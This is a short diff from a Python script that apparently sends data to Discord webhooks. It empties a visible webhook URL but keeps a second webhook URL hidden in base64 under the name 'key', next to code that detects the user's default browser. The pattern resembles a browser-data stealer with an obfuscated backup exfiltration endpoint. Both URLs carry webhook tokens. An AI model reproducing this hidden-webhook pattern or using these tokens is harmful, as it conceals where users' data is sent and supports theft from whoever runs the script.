@@ -16,7 +16,7 @@ import time
 
 
 
-your_hook = "https://discord.com/api/webhooks/1309690780545450025/NZvkR34egLjHTkiPQAsbXEnaSnaFYaJF8WCJTOB9D9tthkAGHAGnC9VOJMsmbolrntmN"
+your_hook = ""
 key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDExNDIzNjE4NTQ0NDM5My9NLUVrSkVxNl9TcHNyYU5YNERDbE5HN1I2QnU1RTFRQlJrci1EVkdacFhocFY4RHM2YnZHWEZWbTQ0bm1DTlE1YjhTOA=="
 default = webbrowser.get()
 browser_name = default.name.split("/")[-1].split(".")[0]
